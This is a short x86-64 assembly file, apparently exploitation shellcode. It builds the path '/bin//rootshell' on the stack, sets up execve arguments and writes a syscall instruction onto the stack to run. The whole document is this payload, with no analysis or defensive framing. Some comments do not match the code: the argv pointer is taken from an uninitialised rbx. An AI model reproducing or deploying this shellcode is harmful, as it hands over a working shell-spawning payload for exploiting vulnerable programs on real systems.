bits 64
# Pad with four zeros
db 0x00, 0x00, 0x00, 0x00

push rbp
# Pushing 0x00000000, which is the second argument of argv[]
xor rax, rax
push rax

# The string "/bin//rootshell", literally
mov rdi, 0x006c6c656873746f
push rdi
mov rdi, 0x6f722f2f6e69622f
push rdi

# 1st argument (filename)
mov rdi, rsp
# 3rd argument (envp), should be 0x00000000
push rax
mov rdx, rsp
# 2nd argument (argv), is a pointer to 1st argument
push rbx
mov rsi, rsp

mov r10, 0x060f
sub r10, 0x100
push r10

mov al, 0x3b
call rsp
ret
